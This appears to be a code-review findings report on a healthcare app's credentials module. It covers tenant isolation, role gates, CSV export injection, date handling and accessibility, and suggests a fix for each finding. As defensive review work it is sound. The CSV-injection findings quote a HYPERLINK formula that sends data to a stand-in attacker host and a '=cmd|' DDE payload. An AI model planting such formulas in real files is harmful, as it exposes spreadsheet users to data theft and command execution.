# Credentials Code Review — Raw Findings

**Date:** 2026-04-29
**Source:** Senior code-reviewer pass against the Credentials surface inventory.
**Status:** Read-only sample review across all 8 focus areas. Inventory at [`2026-04-29-credentials-inventory.md`](2026-04-29-credentials-inventory.md).

> Read-only review. Triage + fix is a separate cycle. Output feeds the cross-area aggregation step alongside `2026-04-29-hipaa-code-review.md` and `2026-04-29-osha-code-review.md`.

**Summary: 4 Critical / 11 Important / 12 Minor**

## CRITICAL (4)

### C-1. Credential projections lack cross-tenant guard
- **Files:** `src/lib/events/projections/credential.ts:43-86` (`projectCredentialUpserted`), `:88-105` (`projectCredentialRemoved`), `:111-130` (`projectCeuActivityLogged`), `:132-141` (`projectCeuActivityRemoved`), `:143-162` (`projectCredentialReminderConfigUpdated`)
- **Issue:** Same hole HIPAA C-1 found on `projectSraCompleted`. None of the five credential projections verify that the row being mutated actually belongs to `args.practiceId`. The reference implementation at `sraDraftSaved.ts:52` (`if (existing && existing.practiceId !== practiceId) throw`) is NOT mirrored anywhere in `credential.ts`.
  - `projectCredentialUpserted` upserts on `payload.credentialId` (a global cuid). If a malicious event payload supplies the credentialId of a credential in Practice B, the upsert silently overwrites Practice B's row with Practice A's `credentialTypeId`, `holderId`, `licenseNumber`, dates, and clears `retiredAt`. The `holderId` change is particularly dangerous — Prisma's FK on `holderId → PracticeUser.id` does NOT verify same-practice; the holder could be a `PracticeUser` belonging to Practice A, attached to a credential row owned by Practice B.
  - `projectCredentialRemoved` reads `existing.credentialTypeId` (line 95) but never `existing.practiceId`. The subsequent `update` and `rederiveForCredential(tx, practiceId, ...)` call run against `args.practiceId`, so a Practice-A actor can soft-delete a Practice-B credential AND mis-rederive Practice A's score with Practice B's credential type.
  - `projectCeuActivityLogged` calls `tx.ceuActivity.create({ data: { ..., practiceId, credentialId } })` with no check that `credentialId` resolves to a credential in the same practice. A forged event can write a CEU activity into Practice A's books for Practice B's credential — this poisons Practice A's CEU progress totals AND links a Practice-A `practiceId` row to a Practice-B `credentialId` (corruption of the foreign-key invariant).
  - `projectCeuActivityRemoved` updates by `payload.ceuActivityId` with no check that the activity is in `args.practiceId`. A forged event can soft-delete any CEU activity in any practice.
  - `projectCredentialReminderConfigUpdated` upserts on `payload.credentialId` with no cross-tenant check. The `create` branch sets `practiceId: args.practiceId` AND `credentialId: payload.credentialId` — so a forged event creates a config row whose `practiceId` is Practice A but whose `credentialId` is Practice B's, triggering renewal-reminder spam against Practice B's credential charged to Practice A's audit trail.
- **Why it matters:** Action-level `verifyCredentialInPractice` (`actions.ts:53-59`) covers the public action surface, but ADR-0001 specifies `appendEventAndApply` is the only mutation path — meaning ANY future code path that emits these event types (cron, batch backfills, evidence-pipeline triggers, the future `updateCredentialAction`) bypasses the action-layer guard. The defense-in-depth model expects the projection itself to be tenant-safe.
- **Fix:** Mirror the `sraDraftSaved.ts:52` pattern at the start of each of the five projection functions:
  ```ts
  const existing = await tx.credential.findUnique({
    where: { id: payload.credentialId },
    select: { practiceId: true },
  });
  if (existing && existing.practiceId !== practiceId) {
    throw new Error(`CREDENTIAL_UPSERTED refused: credential ${payload.credentialId} belongs to a different practice`);
  }
  ```
  Same guard adapted for `CeuActivity` and `CredentialReminderConfig`. For the CEU-logged path, also assert that `payload.credentialId` resolves to a credential whose `practiceId === args.practiceId` BEFORE creating the activity (otherwise the activity row's `practiceId` and the credential's `practiceId` can diverge).

### C-2. `addCredentialAction` and `removeCredentialAction` lack OWNER/ADMIN role gate
- **File:** `src/app/(dashboard)/programs/credentials/actions.ts:61-96` (add), `:260-283` (remove)
- **Issue:** Mirrors HIPAA C-2 / OSHA C-2. `addCredentialAction` only checks `if (!pu)` (line 64); `removeCredentialAction` only checks `if (!pu)` (line 263). `bulkImportCredentialsAction` (line 144), `logCeuActivityAction` (line 313), `removeCeuActivityAction` (line 370), and `updateReminderConfigAction` (line 429) all DO gate on OWNER/ADMIN. The two unguarded actions are the most consequential ones — they create and destroy credential rows that drive DEA / CLIA / CMS framework derivation rules.
- **Why it matters:** Any authenticated MEMBER, STAFF, or VIEWER can:
  - Create a fake DEA credential to flip `DEA_REGISTRATION` from GAP → COMPLIANT and falsely inflate the DEA framework score (audit-defense impact — auditor sees "passed" without an actual registration on file).
  - Soft-delete the practice's only legitimate DEA credential, flipping `DEA_REGISTRATION` to GAP and dropping the framework score. This is data corruption from a low-privilege user — the audit trail records a `CREDENTIAL_REMOVED` event, but VIEWER-tier users should not be able to emit it.
  - The same path applies for CLIA, CMS_PECOS_ENROLLMENT, CMS_NPI_REGISTRATION, CMS_MEDICARE_PROVIDER_ENROLLMENT — five framework rules backed by `credentialTypePresentRule`.
- **Fix:** Add `if (pu.role !== "OWNER" && pu.role !== "ADMIN") throw new Error("Forbidden");` to both actions, matching the existing pattern in `bulkImportCredentialsAction:144-146`. Or refactor to `await requireRole("ADMIN")` (helper exists at `src/lib/rbac.ts:37`) for all six credential actions.

### C-3. `/api/credentials/export` lacks OWNER/ADMIN role gate
- **File:** `src/app/api/credentials/export/route.ts:13-22`
- **Issue:** Endpoint authenticates via `requireUser()` + `getPracticeUser()` but performs no role check. Any authenticated MEMBER, STAFF, or VIEWER from the practice can hit `GET /api/credentials/export` and download every active credential's `licenseNumber`, `holderEmail`, `issuingBody`, `notes`, plus issue/expiry dates. The `notes` field is unstructured free text up to 2000 chars (`actions.ts:29`) — operators commonly stash board action history, settlement details, or mental-health-license caveats there.
- **Why it matters:** The CSV bundles HR-sensitive employment data (every clinician's professional license number tied to their email and any free-text notes). VIEWER role is meant for read-only program participants (e.g. a contractor, a part-time consultant) and should not be exfiltrating the full credentials register. The `Content-Disposition: attachment` plus practice-name filename makes leak detection harder. Mirrors HIPAA C-3 (no rate limit on token routes) and OSHA C-2 (PDF route role gate).
- **Fix:** Add `if (pu.role !== "OWNER" && pu.role !== "ADMIN") return NextResponse.json({ error: "Forbidden" }, { status: 403 });` at line 22. Mirrors the gate already present on `bulk-import/page.tsx:17` for the upload counterpart. Optional: add an audit-event emission (`CREDENTIAL_EXPORT_GENERATED` mirroring OSHA M-9) so the EventLog records who pulled the register.

### C-4. CSV export and bulk-import template are vulnerable to CSV injection (formula prefix)
- **Files:** `src/components/gw/BulkCsvImport/parseCsv.ts:128-134` (`csvEscape`), `src/app/api/credentials/export/route.ts:46-55` (uses `buildCsv`), `src/app/(dashboard)/programs/credentials/bulk-import/CredentialBulkImport.tsx:10-14` (template)
- **Issue:** `csvEscape` only quotes values that contain `,` `"` or newlines. It does NOT prefix a leading `=` `+` `-` `@` `\t` `\r` with a defensive single-quote or zero-width character. CSV injection via formula prefix is the OWASP-cataloged risk: a credential `notes` field containing `=HYPERLINK("http://attacker.example/?u="&A1, "Click for renewal info")` — or `=cmd|'/C calc'!A1` on legacy Excel — gets rendered as a live formula when the operator opens the export in Excel/Sheets.
- **Why it matters:**
  - The credentials CSV is round-tripped: an attacker with MEMBER access (per C-2 above) creates a credential with a formula in `title` / `notes` / `licenseNumber` / `issuingBody`, then waits for an OWNER to download `/api/credentials/export` and open it in Excel. The OWNER's machine — the one with state-board portal access, EHR access, and email — executes the formula. Fields go into spreadsheets shared with auditors, accountants, malpractice carriers — all targets.
  - Bulk-import template (`CredentialBulkImport.tsx:10`) does not warn about this; users who copy/edit the template could paste in third-party data with formula prefixes.
  - Cross-cutting with all bulk-imports — `BulkCsvImport` is shared, so this finding applies to credentials, vendors, tech assets, and any future bulk-import surface.
- **Fix:** In `parseCsv.ts:128`, prepend a single-quote when the cell starts with `=` `+` `-` `@` `\t` or `\r` (the OWASP recommendation):
  ```ts
  function csvEscape(value: string): string {
    if (value === "") return "";
    let out = value;
    if (/^[=+\-@\t\r]/.test(out)) out = `'${out}`;
    if (/[,"\n\r]/.test(out)) return `"${out.replace(/"/g, '""')}"`;
    return out;
  }
  ```
  Also add a unit test asserting `=cmd|...` becomes `'=cmd|...` and survives the round-trip parse correctly.

## IMPORTANT (11)

### I-1. PDF and badge dates render in UTC, not practice timezone
- **Files:** `src/lib/audit/credentials-register-pdf.tsx:150` (generated date), `:182-183` (per-row expiry), `:108-109` (status thresholds via getTime), `src/app/(dashboard)/programs/credentials/[id]/CredentialDetail.tsx:329` (CEU window-start), `:419` (activity date), `src/lib/notifications/generators.ts:128` (cred body), `:210` (renewal body), `:800` (CMS body), `:1210` (escalation body)
- **Issue:** Mirrors HIPAA I-1 / OSHA I-1 + I-4. Every date in the credentials surface uses `.toISOString().slice(0, 10)`, hardcoding UTC. For an Arizona practice (MST, no DST, UTC-7), a credential renewed 2026-06-30 18:00 MST stores as `2026-07-01T01:00:00Z` and renders on the PDF/email/badge as `2026-07-01` — one day past the actual practice-local expiry. State boards and CMS portals enforce the day-precision date the operator submitted.
- **Why it matters:**
  - Renewal reminder generators (`generators.ts:200`) match a milestone day via `daysUntil(cred.expiryDate)` which floors the time-zone difference into the day boundary; an operator submitting renewals on the day they're due may receive a "due in 1 day" reminder a day late. Cascade: the 14-day escalation (`generators.ts:1131`) fires off an unread `CREDENTIAL_EXPIRING` whose `entityKey` embeds the UTC date string — drift of 1 day means the escalation won't dedupe correctly when the credential's expiry is renewed in place across the year boundary.
  - Audit PDF (`credentials-register-pdf.tsx:150`): "Generated 2026-12-31" prints when the PDF was actually generated 2026-12-31 23:00 PST = 2027-01-01 07:00 UTC. CMS site visit Jan 2 sees a register that says it was generated "yesterday" but the metadata field shows "two days ago."
- **Fix:** Single architectural fix that pairs with HIPAA I-1 + OSHA I-1/I-4: add `practice.timezone String?` to the schema, default from `primaryState`, hoist a `formatPracticeDate(date, tz)` helper to `src/lib/audit/format.ts`, replace all `toISOString().slice(0,10)` dates in audit/PDF/notification code paths.

### I-2. Bulk-import duplicates use `licenseNumber || title` as identity, leading to false-positive dedup
- **File:** `src/app/(dashboard)/programs/credentials/actions.ts:187`
- **Issue:** `const id = ${(row.licenseNumber ?? row.title).toLowerCase()}::${row.credentialTypeCode.toUpperCase()}`. Two distinct credentials of the same type with no license number but the same title — e.g. both staff have a row titled "BLS card" — get flagged as `DUPLICATE_IN_BATCH`, dropping one. Conversely, two credentials with the same license number but different types (rare but possible — e.g. an issuing body that recycles numbers across registries) get merged.
- **Why it matters:** For a 100-row staff onboarding bulk-import where the OWNER copies the same template per holder, several rows will silently disappear from the import with `DUPLICATE_IN_BATCH` status — the OWNER then has to manually reconcile, defeating the point of bulk import.
- **Fix:** Include `holderEmail` (or `holderId` after resolution) in the dedup key so that two staff each with a "BLS card" row import correctly:
  ```ts
  const id = `${(row.licenseNumber ?? row.title).toLowerCase()}::${row.credentialTypeCode.toUpperCase()}::${(row.holderEmail ?? "").toLowerCase()}`;
  ```

### I-3. CEU progress bar window-start uses `setUTCMonth` — drifts by a day at month boundaries
- **File:** `src/app/(dashboard)/programs/credentials/[id]/CredentialDetail.tsx:94-100`
- **Issue:** `windowStart.setUTCMonth(windowStart.getUTCMonth() - windowMonths)`. JavaScript `Date.setMonth` clamps when the new date is invalid — e.g., on a 2026-03-31 launch with `windowMonths = 1`, `setUTCMonth(2)` produces 2026-03-03 (March), not 2026-02-28 as a clinician would expect. For a 24-month CEU window starting on a 30th/31st, the boundary slides forward by 1-3 days each year.
- **Why it matters:** A CEU activity logged on 2024-04-30 might count toward the 2024-04-30 → 2026-04-30 window in one render and a different window after `Date` clamping. The progress bar shows different "% complete" numbers on consecutive renders. Counterintuitive — and small enough to escape user reports while cumulatively lying to the clinician about whether they've cleared their requirement.
- **Fix:** Use a calendar-arithmetic helper that handles month-end correctly:
  ```ts
  const windowStart = new Date(now);
  windowStart.setUTCDate(1);
  windowStart.setUTCMonth(windowStart.getUTCMonth() - windowMonths);
  // Then optionally clamp the day back to original-or-last-of-month
  ```
  Or better: use `date-fns`'s `subMonths` which already handles this, or compute via `Date.UTC(now.getUTCFullYear(), now.getUTCMonth() - windowMonths, now.getUTCDate())` and accept the clamp behavior as documented.

### I-4. CSV bulk-import CSV-injection in template + parser permits formula in import
- **File:** `src/app/(dashboard)/programs/credentials/bulk-import/CredentialBulkImport.tsx:10-14`, `actions.ts:138-258`
- **Issue:** Sister finding to C-4. The bulk-import CSV parser does NOT strip leading `=` `+` `-` `@` from cell values before storing in the database. An imported `notes` field containing `=cmd|'/C calc'!A1` is persisted verbatim, then re-emitted in the CSV export (C-4) as a live formula. Even without C-4, the value is also rendered into the badge tooltip + reminder email body + audit PDF — those surfaces don't execute formulas, but the value is now durably stored as adversarial data.
- **Why it matters:** Even without exfiltration via export, an attacker with MEMBER access can persist a formula payload, then social-engineer an OWNER into exporting and opening in Excel. The persistence layer becomes a cross-channel injection vector.
- **Fix:** In `bulkImportCredentialsAction` (action.ts:176), before pushing into the payload, strip/quote leading formula chars:
  ```ts
  function sanitizeCell(s: string | null | undefined): string | null {
    if (!s) return s ?? null;
    return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
  }
  ```
  Apply to `title`, `licenseNumber`, `issuingBody`, `notes`. Pairs with C-4 — either fix kills the round-trip exploit but doing both gives defense-in-depth.

### I-5. `EXPIRING_SOON` boundary disagrees between page derivation, badge, Concierge tool, PDF, and notification generator
- **Files:** `src/app/(dashboard)/programs/credentials/page.tsx:14,21` (90 days, `<=`), `src/lib/ai/conciergeTools.ts:221,234` (90 days, `<=`), `src/lib/audit/credentials-register-pdf.tsx:100,109` (60 days, `<`), `src/lib/notifications/generators.ts:103,108` (60 days, `lte`), `:160,179` (default 90/60/30/7 milestones)
- **Issue:** Five different code paths compute "expiring soon" with **two different windows** — 90 days for the Page + Concierge, 60 days for the PDF + the `CREDENTIAL_EXPIRING` notification. Per memory: `list_credentials` and the page must agree (PR A2 polish locked this). They DO — but the audit PDF and the notification generator use 60 days, so a credential expiring in 75 days:
  - Page badge shows orange "Expiring 2026-XX-XX"
  - PDF status column shows green "Current"
  - Notification generator (`generateCredentialNotifications`) does not fire
  - Renewal milestone generator (`generateCredentialRenewalNotifications`) does fire (90/60/30/7 default)
  - Concierge `list_credentials` shows EXPIRING_SOON
- **Why it matters:** Operator sees orange badge in the UI, downloads the PDF for the state board renewal packet, sees the green "Current" status — confusion + lost trust. Inspector sees the same divergence. No clear "source of truth" — the UI tells one story, the PDF tells another.
- **Fix:** Centralize: extract a `EXPIRING_SOON_DAYS = 90` constant into `src/lib/credentials/constants.ts` (alongside the 4-state derivation function memory says is shared). Replace the hardcoded `60 * 24 * 60 * 60 * 1000` in the PDF (`SOON_MS = 60 * DAY_MS`) and the `60 * DAY_MS` in `generateCredentialNotifications` (line 103). Author one `getCredentialStatus(cred, now): CredentialStatus` helper used by all five callers.

### I-6. `generateCredentialNotifications` uses `>` lower bound for already-expired creds, dropping them after 30 days
- **File:** `src/lib/notifications/generators.ts:103-108`
- **Issue:** `expiryDate: { lte: horizon, gt: new Date(Date.now() - 30 * DAY_MS) }`. Reads as: "expiry is on/before 60 days from now AND more than 30 days ago." A credential that expired 31+ days ago **does not** generate a `CREDENTIAL_EXPIRING` notification. The compiler comment at line 122-123 says `daysLeft <= 0 ? "CRITICAL"` — implying past-expiry is supposed to fire CRITICAL — but the WHERE clause has already filtered it out.
- **Why it matters:** A licensed MD whose state license expired 35 days ago is silently in COMPLIANCE GAP land. Their DEA, CLIA, CMS framework rules drop. The renewal generator (`generateCredentialRenewalNotifications`) explicitly skips expired creds (line 192). The expiring generator filters them out for being too-far-expired. The escalation generator only fires off pre-existing unread `CREDENTIAL_EXPIRING` rows. So a credential that goes silently 30+ days unrenewed exits the notification surface entirely. The 14-day escalation never fires after the 30-day drop.
- **Fix:** Drop the lower bound — past-expiry credentials should keep firing `CREDENTIAL_EXPIRING` daily until the operator either renews or retires:
  ```ts
  expiryDate: { lte: horizon },  // remove the gt bound entirely
  ```
  Dedup is via `entityKey` which embeds the date — the daily attempt will collide with the existing row, no spam. (Or change the entityKey scheme so each unrenewed week generates a fresh CRITICAL.)

### I-7. `generateCredentialEscalationNotifications` exact-string-match on `expiryDate` defeats the cross-check
- **File:** `src/lib/notifications/generators.ts:1198-1201`
- **Issue:** Cross-check at line 1200-1201:
  ```ts
  const currentDateStr = cred.expiryDate.toISOString().slice(0, 10);
  if (currentDateStr !== originalDateStr) continue; // renewed in place
  ```
  Equality test on the YYYY-MM-DD string. If an OWNER bumps the expiry by even 1 day for clerical reasons (corrects a typo, aligns to fiscal year), the escalation skips. Conversely, if the credential's `expiryDate` is renewed but to the SAME YYYY-MM-DD next year (rare but possible — biennial-cycled creds), the escalation fires inappropriately.
- **Why it matters:** The intent (per the comment at line 1194) is "credential is unrenewed if its expiryDate hasn't been pushed past the date that fired the original notification." The implementation checks "is the expiry date string identical." A correctness gap that can flip the escalation either way at month-end / year-boundaries. This pairs with the more general I-6 + I-1 pattern.
- **Fix:** Compare as Date objects: if `cred.expiryDate.getTime() > new Date(originalDateStr + "T23:59:59Z").getTime()` then skip (renewed). Otherwise escalate.

### I-8. CEU progress bar `requiredHours > 0 ? ... : 0` silently shows 100% bar for credentials with `ceuRequirementHours = null`
- **File:** `src/app/(dashboard)/programs/credentials/[id]/CredentialDetail.tsx:101`
- **Issue:** `const pct = requiredHours > 0 ? (totalHours / requiredHours) * 100 : 0;`. The component is gated by `showCeuProgress = ceuRequirementHours != null && ceuRequirementWindowMonths != null` (line 118-120) — so the `useMemo` returns null when those are null and the bar doesn't render. BUT a row in `CredentialType` could legitimately have `ceuRequirementHours = 0` (mark as "no CEU required"). In that case, `showCeuProgress` is true (zero is not null), the bar renders, `pct = 0`, bucket = "low", status reads "Behind schedule" — visually wrong.
- **Why it matters:** Currently no seeded CredentialType has `ceuRequirementHours = 0`, but the seed file is editable and the schema permits it. Defensive code is cheap.
- **Fix:** Treat 0 the same as null:
  ```ts
  const showCeuProgress =
    !!credentialType.ceuRequirementHours &&
    !!credentialType.ceuRequirementWindowMonths;
  ```

### I-9. AddCredentialForm `<select>` options have no proper labelling for screen readers
- **File:** `src/app/(dashboard)/programs/credentials/AddCredentialForm.tsx:108-138`, `:152-183`
- **Issue:** Mirrors HIPAA I-8 + OSHA I-9/I-10. Each `<label>` wraps the `<select>` directly, which is OK for click-to-focus, but no `htmlFor`/`id` association. Worse, the `<span>` "Type *" floats above the select with no programmatic link — screen readers announce "select, Type *" with the asterisk read literally as "asterisk" instead of "required." `required` attribute on the select is correct, but no `aria-required="true"` and no error-association via `aria-describedby`.
- **Why it matters:** WCAG 2.1 AA 1.3.1 (Info and Relationships) and 4.1.2 (Name, Role, Value) — operators using JAWS/NVDA navigating Add-Credential will hear "select" without context.
- **Fix:** Add `id="cred-type"` + `htmlFor="cred-type"` (move to `<label>` element). Replace the asterisk with `aria-required="true"`; visually keep the asterisk as a CSS pseudo-element. Wrap the form-level error in `<p id="cred-form-error" role="alert">` and add `aria-describedby="cred-form-error"` to the relevant input when set.

### I-10. ReminderConfigForm enabled-checkbox lacks programmatic label
- **File:** `src/app/(dashboard)/programs/credentials/[id]/CredentialDetail.tsx:795-807`
- **Issue:** Mirrors HIPAA I-9. Implicit-association `<label>` wraps the `<input>` and a `<span>`. No `id` on the input, no `htmlFor` on the label. Works for sighted click-targets but screen readers may not announce the label as "Email me before this credential expires" reliably across browsers.
- **Fix:** Add `id="cred-reminder-enabled"` to the input, `htmlFor="cred-reminder-enabled"` to the wrapping `<label>`. Same pattern for the milestoneDays input (does have an `htmlFor`, line 810 — good).

### I-11. `getCredentialStatus()` derivation is duplicated three times with subtly different logic
- **Files:** `src/app/(dashboard)/programs/credentials/page.tsx:17-23`, `src/lib/ai/conciergeTools.ts:227-244`, `src/lib/audit/credentials-register-pdf.tsx:102-111`
- **Issue:** Three separate implementations of "compute the 4-state status":
  - `page.tsx`: returns `"NO_EXPIRY" | "EXPIRED" | "EXPIRING_SOON" | "ACTIVE"` with `<= 90` days as boundary, uses `<` for expired.
  - `conciergeTools.ts`: same return type, uses `<= 90` as boundary; uses `<` for expired (`if (t < now)`).
  - `credentials-register-pdf.tsx`: uses 60 days, returns labels `"No expiry" | "EXPIRED" | "Expiring soon" | "Current"` (label disagrees with the other two), uses `<` for expired.
  Per memory: `list_credentials` and the page must use the same derivation function. They currently happen to agree, but only because both implementations independently picked `<= 90`. There is no shared function — drift waiting to happen.
- **Why it matters:** Inventory open-question §13 + §14 specifically called out "are page list and Concierge tool consistent?" The answer today is "yes by parallel construction, no by code structure." Cross-cutting with I-5 (boundary mismatch) and the v1 polish work that landed for `NO_EXPIRY` ordering.
- **Fix:** Extract `getCredentialStatus(expiryDate: Date | null, now = new Date()): CredentialStatus` to `src/lib/credentials/status.ts`. Same file exports `EXPIRING_SOON_DAYS = 90` constant. Three call-sites import and use; PDF status-label mapping stays in PDF (it's a label-formatting concern, not a derivation concern).

## MINOR (12)

### M-1. `actions.ts:38` "noon-UTC" comment is correct but invites confusion when later read by a TZ-aware reader
- **File:** `actions.ts:36-41`
- **Issue:** Helper `toIso` deliberately picks noon-UTC to avoid timezone-rollover edge cases. The comment explains why, but doesn't explain the read-side implication: when the badge / PDF render `iso.slice(0, 10)`, they get the correct calendar day for ANY timezone west of UTC+12 and east of UTC-12 — i.e., for all real-world deployments noon-UTC is safe. Worth leaving a longer explanatory comment so the next reader doesn't "fix" this to user-local-midnight (which would re-introduce the drift it was designed to avoid).
- **Fix:** Expand the comment to: `// Pinning to 12:00:00.000Z keeps the YYYY-MM-DD slice stable across all real-world practice timezones (UTC-12 through UTC+12). DO NOT change to user-local-midnight without timezone awareness.`

### M-2. Bulk-import does not enforce the 200-row cap until AFTER full row resolution
- **File:** `actions.ts:147-150`
- **Issue:** `if (input.rows.length > MAX_BATCH) throw` is checked first — good. But `BulkCsvImport.tsx:87-94` enforces it client-side at parse time. A direct API hit (skipping the UI) sends 5000 rows, runs the practiceUser.findMany + credentialType.findMany + per-row validation, then throws. Wasted DB round-trips. Net: an unauthenticated request would 401, but an authenticated MEMBER-tier request can still make 5000 rows of work happen pre-throw. (Server-side throw is correct; the optimization is to early-reject sooner.)
- **Fix:** Move the cap check above the lookup-resolution block. Already at the top of the function — fine. But add a Zod `.max(MAX_BATCH)` on the rows array so the schema parse rejects oversize input even earlier:
  ```ts
  const BulkInput = z.object({ rows: z.array(BulkCredentialRow).max(MAX_BATCH) });
  ```

### M-3. CSV export and bulk-import template both omit a UTF-8 BOM
- **File:** `route.ts:58-65`, `CredentialBulkImport.tsx:10-14` (template)
- **Issue:** Excel on Windows interprets a BOM-less UTF-8 CSV as Windows-1252, mangling em-dashes (—) and any non-ASCII names. Operators copy/pasting Smith/Schmidt/Müller into license `notes` see garbled output in Excel.
- **Fix:** Prepend `"﻿"` to the CSV body in `buildCsv`, and to the static `TEMPLATE_CSV` constant. Or set `Content-Type: text/csv; charset=utf-8` (already done at line 61) AND the BOM (Excel ignores the charset header until the BOM is present).

### M-4. `CredentialActions.tsx:15-23` swallows errors silently
- **File:** `CredentialActions.tsx:15-23`
- **Issue:** `catch (err) { console.error("removeCredentialAction failed", err); }`. No user feedback. Click "Remove," nothing happens, no error message. Inventory open-question §10 (orphan-credential UX): when the practice user is removed and the credential FK is `SetNull`, what happens? Right now, even a clear server error would surface only in the dev console.
- **Fix:** Add a `useState` for error + render below the button. Match `CeuActivityRow.tsx:402-415` pattern.

### M-5. `removeCredentialAction` does not require confirm dialog despite being destructive
- **File:** `CredentialActions.tsx:15-29`
- **Issue:** No `confirm("Remove this credential?")` before invoking. CEU activity removal does (CredentialDetail.tsx:406). Easy mis-click on mobile, especially because `<Button variant="ghost">` has no destructive styling.
- **Fix:** Add `confirm(...)` with credential title interpolated. Alternatively, hoist to a shared `<DestructiveButton>` component (also useful for the policy/incident/vendor remove patterns).

### M-6. `CredentialDetail.tsx` 848 LOC houses 6 distinct concerns; recommend split
- **File:** `CredentialDetail.tsx` (entire file)
- **Issue:** Single component file contains: (1) main `CredentialDetail` orchestrator, (2) `CeuProgressBar`, (3) `CeuActivityList`, (4) `CeuActivityRow` (server-action-wired), (5) `NewCeuActivityForm` (full client form), (6) `ReminderConfigForm` (full client form), plus helpers (`fmtDate`, `makeUuid`, `computeCeuProgress`, `formatMilestones`, `parseMilestones`, `DEFAULT_MILESTONES` constant). Each of `NewCeuActivityForm` and `ReminderConfigForm` could be its own file (~150 LOC each); `CeuActivityRow` is naturally separate from the table.
- **Why it matters:** Anything touching the file invalidates the bundle for the entire credentials surface. Reviewability suffers — the PR diff for "add a CEU note field" is 200 LOC of context for a 5-LOC change. Tests (`credential-ceu-action.test.ts`) currently exercise only the action entry-point, not the React state wiring; a smaller component would make Vitest+jsdom tests on each form practical.
- **Fix:** Move `CeuProgressBar`, `CeuActivityList + CeuActivityRow`, `NewCeuActivityForm`, `ReminderConfigForm` to sibling files in `src/app/(dashboard)/programs/credentials/[id]/ceu/` and `[id]/reminders/`. Hoist `fmtDate` to `src/lib/credentials/format.ts` (pairs with I-1).

### M-7. `[id]/page.tsx` fetches `evidence.findMany` for entity types `"CREDENTIAL"` but no test asserts the entity-key shape matches what the upload pipeline writes
- **File:** `[id]/page.tsx:57-65`
- **Issue:** `entityType: "CREDENTIAL"` is a string literal. If the EvidenceUpload component or the upload pipeline writes a different value (e.g. `"CREDENTIAL_FILE"` or `"CRED"`), the join silently returns `[]` — the credential has uploaded evidence but the detail page shows none. No test of this round-trip.
- **Fix:** Either make `entityType` an enum (best — type-safe at compile time), or add a `EntityType` constant exported from a shared module and used by both the uploader and the reader. Pair with a smoke test that uploads → reads → asserts the row appears.

### M-8. `bulkImportCredentialsAction` does not detect existing-row duplicates (always emits `INSERTED`, never `ALREADY_EXISTS` or `UPDATED`)
- **File:** `actions.ts:138-258`, output type `BulkPerRowResult` has `"UPDATED" | "ALREADY_EXISTS"` cases (line 121-125)
- **Issue:** The action defines four possible status values but only ever emits `INSERTED`, `DUPLICATE_IN_BATCH`, `INVALID`. There is no existing-row check before emitting `CREDENTIAL_UPSERTED` — every successful row is "INSERTED" with a fresh `randomUUID()`. Re-running the same CSV creates 200 brand-new rows with the same `licenseNumber` per credential — no idempotency. Inventory comment line 65 says "intra-batch dedup" only; correct, but the UI promises four possible outcomes per the type.
- **Why it matters:** The UI surfaces "0 ALREADY_EXISTS" misleadingly. Operators expect bulk-import to be idempotent (re-running with the same CSV is a no-op). Today it duplicates the entire register. The 200-row cap then becomes a 100-row practical cap if you ever re-run.
- **Fix:** Before generating a new `randomUUID()`, query the existing Credential by `(practiceId, credentialTypeId, holderId, licenseNumber)`. If found and not `retiredAt`, either skip (`ALREADY_EXISTS`) or re-emit with the existing id (`UPDATED`). Document the chosen semantic in the action comment.

### M-9. `seed-credentials.ts` reference data is not asserted by any test
- **File:** `scripts/seed-credentials.ts` (~120 LOC), no test coverage
- **Issue:** The 52 credential types from `_v1-credential-types-export.json` are loaded by every test (per `beforeEach` patterns we observed), but no test asserts that critical types like `DEA_CONTROLLED_SUBSTANCE_REGISTRATION`, `CLIA_WAIVER_CERTIFICATE`, `MEDICARE_PECOS_ENROLLMENT`, `MD_STATE_LICENSE` actually exist with the expected `code` values. If the seed JSON is edited and a code is renamed, the `credentialTypePresentRule` factory silently returns `null` (rule-doesn't-apply, line 30 of shared.ts) for the renamed type — every framework rule that depends on it flips to NOT_STARTED, undetected.
- **Fix:** Add a smoke test `tests/integration/credential-seed.test.ts` that asserts every code referenced in `dea.ts`, `clia.ts`, `cms.ts`, `generators.ts:CMS_CREDENTIAL_TYPE_CODES` exists in the database after `seed-credentials.ts` runs.

### M-10. `credentialTypePresentRule` does not pre-compute `now` — race against very-near expiry
- **File:** `src/lib/compliance/derivation/shared.ts:32-39`
- **Issue:** `where: { ..., expiryDate: { gt: new Date() } }`. `new Date()` is evaluated at the moment the WHERE clause is sent. Within a single rederive batch (which calls multiple rules in sequence), an `expiryDate` exactly at the boundary may flip between rules. Mostly cosmetic, but parallel to OSHA M-12 ("Date.now() in derivation rules is non-deterministic").
- **Fix:** Pass `now: Date` through the `DerivationRule` signature; default to `new Date()` at the rederive top-level, then propagate. Allows deterministic testing.

### M-11. Ordering of credentials by `holderId` puts null first (PostgreSQL NULLS FIRST default)
- **File:** `page.tsx:56`
- **Issue:** `orderBy: [{ holderId: "asc" }, { expiryDate: "asc" }]`. PostgreSQL's default is `NULLS LAST` for ASC. Practice-level credentials (`holderId = null`) appear AT THE END of the list, but the page intentionally pushes them to the end too (line 84: `if (grouped.has(null)) orderedKeys.push(null)`). However, the **first** sort orders them lexicographically by `holderId` cuid — which is essentially random. Per-holder grouping then displays in cuid-order, not name-order.
- **Why it matters:** Operators expect to see "Alice → Bob → Carol → Practice-level," not "kCqx... → kFwm... → kQyP... → Practice-level."
- **Fix:** Drop the orderBy in the Prisma query (line 56) — it doesn't matter for correctness because the page re-orders by holders' name ordering at line 79-84 anyway. Or join holder.user.firstName/lastName at query time and order by that.

### M-12. `holder` cascade-on-delete behavior on PracticeUser is `SetNull`, but UI does not flag orphan credentials
- **File:** `prisma/schema.prisma:685` (`onDelete: SetNull` on holder), `page.tsx:139` (renders "Unknown" for missing holder)
- **Issue:** Per inventory open-question §10 — when a `PracticeUser` is removed, `Credential.holderId` is set to null. The page groups null-holder rows under "Practice-level" — these orphan credentials are now indistinguishable from genuinely-practice-level rows.
- **Why it matters:** A clinician departing the practice should leave a clear audit trail: their credentials should remain visible (the practice may need to attest "Dr. Jane held this DEA license through 2026-04-15"), not silently merge into the practice-level pile. The 90-day rerendering will keep these credentials live in DEA-rule-counts even though there's no licensee.
- **Fix:** Either: (a) cascade-delete credentials when the holder is removed (probably wrong — destroys audit trail); (b) introduce a soft-delete field `holderDetachedAt` so orphans render distinctly with a grey "Former staff" badge; (c) set a flag at PracticeUser-removal time to retire any credentials owned by that user, surfacing in the audit log. Option (b) is the cleanest given the current event-sourced model.

## Top 5 fix-up priorities

